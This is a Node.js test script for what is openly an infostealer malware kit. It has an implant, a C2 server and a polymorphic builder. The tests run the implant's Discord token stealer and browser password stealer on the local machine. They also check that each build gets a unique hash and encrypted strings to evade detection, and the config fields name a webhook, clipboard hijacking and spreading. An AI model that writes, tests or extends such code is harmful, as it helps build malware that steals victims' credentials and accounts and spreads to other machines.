'use strict';
const fs = require('fs');
const path = require('path');
const cp = require('child_process');
const crypto = require('crypto');
const root = path.join(__dirname, '..');
let fails = 0;
function ok(name, cond, extra) { console.log((cond ? 'PASS' : 'FAIL') + ' ' + name + (extra ? ' - ' + extra : '')); if (!cond) fails++; }
// 1. syntax
for (const f of ['src/implant.js', 'src/c2.js', 'src/builder.js']) {
  try { cp.execFileSync(process.execPath, ['--check', path.join(root, f)], { stdio: 'pipe' }); ok('syntax ' + f, true); }
  catch (e) { ok('syntax ' + f, false, e.message); }
}
// 2. implant exports load (no auto-run: require.main guard)
try {
  const imp = require('../src/implant.js');
  ok('implant loads', !!imp.hwid);
  const h = imp.hwid();
  ok('hwid 32hex', /^[a-f0-9]{32}$/.test(h), h);
  const s = imp.sysinfo();
  ok('sysinfo', !!s.host && !!s.os, s.host);
  const toks = imp.stealDiscordTokens();
  ok('token stealer runs', Array.isArray(toks), toks.length + ' found on this box');
  const b = imp.stealBrowserFiles();
  ok('browser stealer runs', !!(b && Array.isArray(b.passwords)), 'pw=' + (b.passwords || []).length);
} catch (e) { ok('implant runtime', false, e.message); }
// 3. builder polymorphism: 2 builds differ
try {
  const { buildOnce } = require('../src/builder.js');
  const cfg = { OWNER_KEY: 'test-owner-key-000001', DISCORD_WEBHOOK: '', C2_URL: 'http://127.0.0.1:8080', MODE: 'http', CLIPPER: {}, STEAL: {}, SPREAD: {} };
  const a = path.join(root, 'builds', '_t1.js'), bb = path.join(root, 'builds', '_t2.js');
  const m1 = buildOnce(cfg, a), m2 = buildOnce(cfg, bb);
  const h1 = crypto.createHash('sha256').update(fs.readFileSync(a)).digest('hex');
  const h2 = crypto.createHash('sha256').update(fs.readFileSync(bb)).digest('hex');
  ok('builds unique hash', h1 !== h2, h1.slice(0, 12) + ' vs ' + h2.slice(0, 12));
  ok('builds unique id', m1.buildId !== m2.buildId, m1.buildId + ' vs ' + m2.buildId);
  ok('strings encrypted', m1.stringsEncrypted > 200, String(m1.stringsEncrypted));
  try { fs.unlinkSync(a); fs.unlinkSync(a + '.json'); fs.unlinkSync(bb); fs.unlinkSync(bb + '.json'); } catch (e) {}
} catch (e) { ok('builder', false, e.message); }
console.log(fails === 0 ? '\nALL PASS' : '\n' + fails + ' FAILURES');
process.exit(fails === 0 ? 0 : 1);
